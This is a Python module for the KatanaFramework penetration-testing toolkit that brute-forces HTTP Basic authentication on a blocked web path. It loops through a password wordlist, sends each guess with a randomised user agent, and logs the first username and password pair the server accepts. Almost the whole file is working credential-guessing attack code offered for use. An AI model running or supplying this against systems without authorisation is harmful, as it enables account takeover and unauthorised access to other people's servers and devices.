# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KATANAFRAMEWORK import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES
from core.Function import isLive,RamdonAgent,saveRegister
import httplib,base64
# END LIBRARIES 

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="2.0"
	init.Description        ="Brute Force to HTTP folder block."
	init.CodeName           ="web/bt.http"
	init.DateCreation       ="27/02/2015"      
	init.LastModification   ="25/05/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME    VALUE                RQ     DESCRIPTION
		'target':[LOCAL_IP            ,True ,'Host Target'],
		'port'  :[HTTP_PORT           ,False,'Port Target'],
		'path'  :["/DprSetup.asp"     ,True ,'Path blocked'],
		'user'  :[USERNAME            ,True ,'Username target'],
		'dict'  :[DITIONARY_PASSWORDS ,False,'Wordlist'],
	}

	# EXTRA OPTIONS MODULE
	init.extra = {
		# NAME    VALUE                RQ     DESCRIPTION
		'sleep'  :["10"               ,False,'Time of sleep'],
		'threads':["5"                ,False,'Number\'s threads'],
	}

	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):
	isLive(init.var['target'],init.var['port'])
	Loadingfile(init.var['dict'])

	with open(init.var['dict'],'r') as passwords:
		for password in passwords:
			password=password.replace("\n","")
			connection = httplib.HTTPConnection(init.var['target'],init.var['port'])
			header={"User-agent" : RamdonAgent(),"Authorization":"Basic "+base64.b64encode(init.var['user']+":"+password)}
			connection.request("GET",init.var['path'],"",header)
			response = connection.getresponse()

			if response.status == 200:
				printAlert(3,"Successfully with ["+init.var['user']+"]["+password+"]\n")
				saveRegister(init,password)
				return
			else:printAlert(0," | Checking '"+password+"'")
	printAlert(4," No Result :c\n")

# END CODE MODULE ############################################################################################